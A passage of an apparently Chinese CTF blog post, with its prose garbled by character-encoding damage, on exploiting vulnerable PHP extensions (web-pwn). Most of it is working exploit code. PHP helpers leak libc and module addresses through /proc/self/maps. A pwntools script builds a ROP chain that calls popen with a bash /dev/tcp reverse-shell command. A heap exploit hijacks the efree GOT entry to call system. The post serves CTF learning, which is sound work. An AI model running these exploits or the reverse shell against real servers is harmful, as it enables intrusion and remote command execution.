          <a href="#1-EXPæ¨¡æ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-EXPæ¨¡æ¿" class="headerlink" title="1.EXPæ¨¡æ¿"></a>1.EXPæ¨¡æ¿</h2>
      <p>å…ˆæ¥å‡ ä¸ªå¸¸ç”¨çš„å‡½æ•°æ¨¡æ¿ï¼Œç”¨æ¥äº¤äº’</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u64</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">   <span class="variable">$s</span> = bin2hex(<span class="variable">$val</span>);</span><br><span class="line">   <span class="variable">$len</span> = strlen(<span class="variable">$s</span>);</span><br><span class="line">   <span class="variable">$ans</span> = <span class="string">&quot;0x&quot;</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="variable">$len</span>-<span class="number">2</span>;<span class="variable">$i</span>&gt;=<span class="number">0</span>;<span class="variable">$i</span>-=<span class="number">2</span>) &#123;</span><br><span class="line">      <span class="variable">$ans</span> = <span class="variable">$ans</span> . substr(<span class="variable">$s</span>,<span class="variable">$i</span>,<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> intval(<span class="variable">$ans</span>,<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="variable">$x</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= chr(<span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨å¯ä»¥è°ƒç”¨includeå‡½æ•°ã€ob_startå‡½æ•°ã€ob_get_contentså‡½æ•°ã€ob_end_flushå‡½æ•°æ—¶</span></span><br><span class="line"><span class="comment">//ä¸€èˆ¬ç”¨åœ¨å¯ä»¥ç›´æ¥å†™phpä»£ç çš„æ—¶å€™</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.27.so/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$p1 = &#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/lib\/php\/20170718\/hackphp.so/&#x27;;</span></span><br><span class="line">    <span class="variable">$p_local</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/www\/server\/php\/73\/lib\/php\/extensions\/no-debug-non-zts-20180731\/my_heap.so/&#x27;</span>;</span><br><span class="line">    preg_match_all(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="comment">//preg_match_all($p1, $buffer, $mbase);</span></span><br><span class="line">    preg_match_all(<span class="variable">$p_local</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = ob_get_contents();</span><br><span class="line">ob_end_flush();</span><br><span class="line">leakaddr(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span>=hexdec(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span>=hexdec(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//å­—ç¬¦ä¸²æ“ä½œ</span></span><br><span class="line"><span class="variable">$pad_str</span> = str_pad(string_var,length,pad_string,pad_type);<span class="comment">//å¡«å……ï¼Œ(pad_typeå‚æ•°å¯é€‰)</span></span><br><span class="line"><span class="variable">$sub_str</span> = substr(<span class="keyword">string</span>,idx,length);<span class="comment">//è·å–å­å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="variable">$str</span> = str_repeat(<span class="string">&#x27;B&#x27;</span>, (<span class="number">0x100</span>));</span><br><span class="line"><span class="comment">//è·å–æ ¼å¼åŒ–è¾“å‡ºå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">echo</span> sprintf(<span class="string">&quot;0x%lx&quot;</span>,<span class="variable">$Libc_addr</span>);</span><br><span class="line"><span class="comment">//å­—ç¬¦ä¸²æ‹¼æ¥</span></span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="comment">//å•ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;\x00&quot;</span>;<span class="comment">//å¿…é¡»æ˜¯&quot;&quot;åŒå¼•å·çš„ï¼Œä¸èƒ½æ˜¯&#x27;&#x27;å•å¼•å·</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>å¹¶ä¸”ä»¥ä¸‹ç»™å‡ºçš„expéƒ½æ˜¯åŸºäºä¸Šé¢çš„æµ‹è¯•ç”¨ä¾‹</p>

        <h2 id="2-æ ¼å¼åŒ–å­—ç¬¦ä¸²"   >
          <a href="#2-æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="2.æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>2.æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2>
      
        <h2 id="3-æ ˆæº¢å‡º"   >
          <a href="#3-æ ˆæº¢å‡º" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æ ˆæº¢å‡º" class="headerlink" title="3.æ ˆæº¢å‡º"></a>3.æ ˆæº¢å‡º</h2>
      <p>ä¸€èˆ¬éƒ½èƒ½å¤Ÿé€šè¿‡è¯»å–<code>/proc/self/maps</code>æ¥æ³„éœ²åœ°å€</p>
<p>æ²¡æœ‰canaryçš„æ—¶å€™ï¼Œå•çº¯æ ˆæº¢å‡ºçš„æ—¶å€™ï¼Œä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•</p>

        <h3 id="1-åˆ©ç”¨poepnåå¼¹shell"   >
          <a href="#1-åˆ©ç”¨poepnåå¼¹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ©ç”¨poepnåå¼¹shell" class="headerlink" title="(1)åˆ©ç”¨poepnåå¼¹shell"></a>(1)åˆ©ç”¨poepnåå¼¹shell</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_php</span>(<span class="params">buf</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pwn.php&quot;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> pf:</span><br><span class="line">        pf.write(<span class="string">&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string">my_stack_func(urldecode(&quot;%s&quot;));</span></span><br><span class="line"><span class="string">?&gt;&#x27;&#x27;&#x27;</span>%urlencode(buf))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#CLI:</span></span><br><span class="line">stack_addr = <span class="number">0x7fffffffa1c0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#GDB:</span></span><br><span class="line"><span class="comment">#stack_addr = 0x7fffffffa1a0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#WEB:</span></span><br><span class="line"><span class="comment">#stack_addr = 0x7fffffffbee0</span></span><br><span class="line"></span><br><span class="line">ELF_base = <span class="number">0x7ffff12efd2a</span> - <span class="number">0xd2a</span></span><br><span class="line"></span><br><span class="line">stack_offset = <span class="number">0xb0</span> + <span class="number">0x8</span></span><br><span class="line">Libc_base = <span class="number">0x7ffff47daf70</span> - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = Libc_base + <span class="number">0x00000000000215bf</span></span><br><span class="line">pop_rsi_ret = Libc_base + <span class="number">0x0000000000023eea</span></span><br><span class="line">popen_addr = Libc_base + libc.sym[<span class="string">&#x27;popen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">command = <span class="string">&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">layout = [</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*stack_offset,</span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    stack_addr+stack_offset+<span class="number">0x30</span>+<span class="number">0x10</span>,</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    stack_addr+stack_offset+<span class="number">0x28</span>,</span><br><span class="line">    popen_addr,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,</span><br><span class="line">    command.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>),</span><br><span class="line">    <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">]</span><br><span class="line">buf = flat(layout)</span><br><span class="line"></span><br><span class="line">create_php(buf)</span><br></pre></td></tr></table></div></figure>

<p>ä»¥ä¸Šä»£ç ç”Ÿæˆä¹‹åï¼Œç›´æ¥php pwn.phpè¿è¡Œæˆ–è€…è°ƒè¯•å³å¯ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒWEBå’ŒCLIçš„æ ˆåœ°å€æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œå¦å¤–åœ¨æœ¬åœ°è¿è¡Œçš„æ—¶å€™ï¼Œç›´æ¥è¿è¡Œphpå’Œè°ƒè¯•phpä¹Ÿæœ‰ç‚¹ä¸å¤ªä¸€æ ·</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121352773.png" alt="image-20220212135202658"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121343134.png" alt="image-20220212134318923"></p>
<p>å‚ç…§<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/204404" >WEBPWNå…¥é—¨çº§è°ƒè¯•è®²è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="ä¾‹é¢˜ä¸€ï¼š2020De1CTF-mixture"   >
          <a href="#ä¾‹é¢˜ä¸€ï¼š2020De1CTF-mixture" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¾‹é¢˜ä¸€ï¼š2020De1CTF-mixture" class="headerlink" title="ä¾‹é¢˜ä¸€ï¼š2020De1CTF-mixture"></a>ä¾‹é¢˜ä¸€ï¼š2020De1CTF-mixture</h4>
      <p>å‚è€ƒ</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235237#h3-4" >WebPwnï¼šphp-pwnå­¦ä¹  - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/" >De1CTF 2020 Web+Pwn mixture | Clangè£ç¼åº— (xuanxuanblingbling.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="2-ropé“¾æ„é€ è°ƒç”¨mprotectå‡½æ•°æ‰§è¡Œshellcode"   >
          <a href="#2-ropé“¾æ„é€ è°ƒç”¨mprotectå‡½æ•°æ‰§è¡Œshellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ropé“¾æ„é€ è°ƒç”¨mprotectå‡½æ•°æ‰§è¡Œshellcode" class="headerlink" title="(2)ropé“¾æ„é€ è°ƒç”¨mprotectå‡½æ•°æ‰§è¡Œshellcode"></a>(2)ropé“¾æ„é€ è°ƒç”¨<code>mprotect</code>å‡½æ•°æ‰§è¡Œshellcode</h3>
      
        <h2 id="4-å †æ–¹é¢"   >
          <a href="#4-å †æ–¹é¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å †æ–¹é¢" class="headerlink" title="4.å †æ–¹é¢"></a>4.å †æ–¹é¢</h2>
      
        <h3 id="å †æœºåˆ¶ï¼š"   >
          <a href="#å †æœºåˆ¶ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#å †æœºåˆ¶ï¼š" class="headerlink" title="å †æœºåˆ¶ï¼š"></a>å †æœºåˆ¶ï¼š</h3>
      <p>é¦–å…ˆç®€å•ä»‹ç»ä¸€ä¸‹å†…å­˜æœºåˆ¶ï¼Œä½¿ç”¨<code>_emallocå’Œ_efree</code>è¿›è¡Œå†…å­˜åˆ†é…å’Œé‡Šæ”¾ï¼Œç±»ä¼¼ä¸åŠ ä»»ä½•ä¿æŠ¤çš„slub/slabæœºåˆ¶ï¼Œå­˜åœ¨FDæŒ‡é’ˆå¯ä»¥å®ç°åŠ«æŒä¹‹åä»»æ„åˆ†é…ï¼Œå¹¶ä¸”åˆ†é…çš„å¤§å°è§„æ ¼å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">//å®å®šä¹‰ï¼šç¬¬ä¸€åˆ—è¡¨ç¤ºåºå·ï¼ˆç§°ä¹‹ä¸ºbin_numï¼‰ï¼Œç¬¬äºŒåˆ—è¡¨ç¤ºæ¯ä¸ªsmallå†…å­˜çš„å¤§å°ï¼ˆå­—èŠ‚æ•°ï¼‰ï¼›</span><br><span class="line">//ç¬¬å››åˆ—è¡¨ç¤ºæ¯æ¬¡è·å–å¤šå°‘ä¸ªpageï¼›ç¬¬ä¸‰åˆ—è¡¨ç¤ºå°†pageåˆ†å‰²ä¸ºå¤šå°‘ä¸ªå¤§å°ä¸ºç¬¬ä¸€åˆ—çš„smallå†…å­˜ï¼›</span><br><span class="line">#define ZEND_MM_BINS_INFO(_, x, y) \</span><br><span class="line">    _( 0,    8,  512, 1, x, y) \</span><br><span class="line">    _( 1,   16,  256, 1, x, y) \</span><br><span class="line">    _( 2,   24,  170, 1, x, y) \</span><br><span class="line">    _( 3,   32,  128, 1, x, y) \</span><br><span class="line">    _( 4,   40,  102, 1, x, y) \</span><br><span class="line">    _( 5,   48,   85, 1, x, y) \</span><br><span class="line">    _( 6,   56,   73, 1, x, y) \</span><br><span class="line">    _( 7,   64,   64, 1, x, y) \</span><br><span class="line">    _( 8,   80,   51, 1, x, y) \</span><br><span class="line">    _( 9,   96,   42, 1, x, y) \</span><br><span class="line">    _(10,  112,   36, 1, x, y) \</span><br><span class="line">    _(11,  128,   32, 1, x, y) \</span><br><span class="line">    _(12,  160,   25, 1, x, y) \</span><br><span class="line">    _(13,  192,   21, 1, x, y) \</span><br><span class="line">    _(14,  224,   18, 1, x, y) \</span><br><span class="line">    _(15,  256,   16, 1, x, y) \</span><br><span class="line">    _(16,  320,   64, 5, x, y) \</span><br><span class="line">    _(17,  384,   32, 3, x, y) \</span><br><span class="line">    _(18,  448,    9, 1, x, y) \</span><br><span class="line">    _(19,  512,    8, 1, x, y) \</span><br><span class="line">    _(20,  640,   32, 5, x, y) \</span><br><span class="line">    _(21,  768,   16, 3, x, y) \</span><br><span class="line">    _(22,  896,    9, 2, x, y) \</span><br><span class="line">    _(23, 1024,    8, 2, x, y) \</span><br><span class="line">    _(24, 1280,   16, 5, x, y) \</span><br><span class="line">    _(25, 1536,    8, 3, x, y) \</span><br><span class="line">    _(26, 1792,   16, 7, x, y) \</span><br><span class="line">    _(27, 2048,    8, 4, x, y) \</span><br><span class="line">    _(28, 2560,    8, 5, x, y) \</span><br><span class="line">    _(29, 3072,    4, 3, x, y)</span><br><span class="line"> </span><br><span class="line">#endif /* ZEND_ALLOC_SIZES_H */</span><br></pre></td></tr></table></div></figure>

<p>å½“è¶…è¿‡3Kæ—¶ï¼Œå¦‚ä¸‹åˆ†é…</p>
<p>hugeå†…å­˜ï¼šé’ˆå¯¹å¤§äº2M-4Kçš„åˆ†é…è¯·æ±‚ï¼Œç›´æ¥è°ƒç”¨mmapåˆ†é…ï¼›</p>
<p>largeå†…å­˜ï¼šé’ˆå¯¹å°äº2M-4Kï¼Œå¤§äº3Kçš„åˆ†é…è¯·æ±‚ï¼Œåœ¨chunkä¸ŠæŸ¥æ‰¾æ»¡è¶³æ¡ä»¶çš„è‹¥å¹²ä¸ªè¿ç»­pageï¼›</p>
<p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000014764790" >ã€PHP7æºç åˆ†æã€‘PHPå†…å­˜ç®¡ç† - SegmentFault æ€å¦</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>å¹¶ä¸”ä¸å­˜åœ¨æˆ‘ä»¬åœ¨glibcä¸­å¸¸è§çš„hookå‡½æ•°ï¼Œæ‰€ä»¥é€šå¸¸getshellçš„åšæ³•ä¸€èˆ¬ä¸¤ç§ï¼š</p>
<p><strong>åŠ«æŒefree_got</strong>æˆ–è€…<strong>åŠ«æŒæŸäº›ç»“æ„ä½“çš„å‡½æ•°æŒ‡é’ˆ</strong></p>

        <h3 id="1-åŠ«æŒefree-got"   >
          <a href="#1-åŠ«æŒefree-got" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åŠ«æŒefree-got" class="headerlink" title="(1)åŠ«æŒefree_got"></a>(1)åŠ«æŒefree_got</h3>
      <p>ä¸è¿‡è¿™ä¸ªéœ€è¦<code>.so</code>æ‹“å±•æ¨¡å—ä¸èƒ½ä¸ºFull RELROï¼Œå¾—èƒ½ä¿®æ”¹å…¶ä¸­çš„gotè¡¨ï¼Œç„¶åè¿˜å¾—åœ¨è¯¥æ‹“å±•æ¨¡å—ä¸­æœ‰è°ƒç”¨<code>_efree</code>å‡½æ•°æ‰è¡Œï¼Œç›¸å½“äºå°±æ˜¯<code>ret2Got</code>ã€‚å¾—æ³„éœ²è¯¥<code>.so</code>æ‹“å±•æ¨¡å—çš„åœ°å€æ‰è¡Œã€‚</p>
<p>è‡ªå®šä¹‰é¢˜ç›®çš„expå¦‚ä¸‹</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u64</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">   <span class="variable">$s</span> = bin2hex(<span class="variable">$val</span>);</span><br><span class="line">   <span class="variable">$len</span> = strlen(<span class="variable">$s</span>);</span><br><span class="line">   <span class="variable">$ans</span> = <span class="string">&quot;0x&quot;</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="variable">$len</span>-<span class="number">2</span>;<span class="variable">$i</span>&gt;=<span class="number">0</span>;<span class="variable">$i</span>-=<span class="number">2</span>) &#123;</span><br><span class="line">      <span class="variable">$ans</span> = <span class="variable">$ans</span> . substr(<span class="variable">$s</span>,<span class="variable">$i</span>,<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> intval(<span class="variable">$ans</span>,<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="variable">$x</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= chr(<span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.27.so/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$p1 = &#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/lib\/php\/20170718\/hackphp.so/&#x27;;</span></span><br><span class="line">    <span class="variable">$p_local</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/www\/server\/php\/73\/lib\/php\/extensions\/no-debug-non-zts-20180731\/my_heap.so/&#x27;</span>;</span><br><span class="line">    preg_match_all(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="comment">//preg_match_all($p1, $buffer, $mbase);</span></span><br><span class="line">    preg_match_all(<span class="variable">$p_local</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_efree_got</span> = <span class="number">0x202068</span>;</span><br><span class="line"><span class="variable">$system_addr</span> = <span class="number">0x4f550</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ob_start(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = ob_get_contents();</span><br><span class="line">ob_end_flush();</span><br><span class="line">leakaddr(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span>=hexdec(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span>=hexdec(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">my_heap_addFunc(<span class="number">0x10</span>);</span><br><span class="line">my_heap_delFunc(<span class="number">0</span>);</span><br><span class="line">my_heap_editFunc(<span class="number">0</span>,p64(<span class="variable">$mod_base</span>+<span class="variable">$_efree_got</span>));</span><br><span class="line">my_heap_addFunc(<span class="number">0x10</span>);</span><br><span class="line">my_heap_editFunc(<span class="number">1</span>,<span class="string">&quot;cat flag\x00&quot;</span>);</span><br><span class="line">my_heap_addFunc(<span class="number">0x10</span>);</span><br><span class="line">my_heap_editFunc(<span class="number">2</span>,p64(<span class="variable">$libc_base</span>+<span class="variable">$system_addr</span>));</span><br><span class="line">my_heap_delFunc(<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>




        <h3 id="2-åŠ«æŒget-methodå‡½æ•°æŒ‡é’ˆ"   >
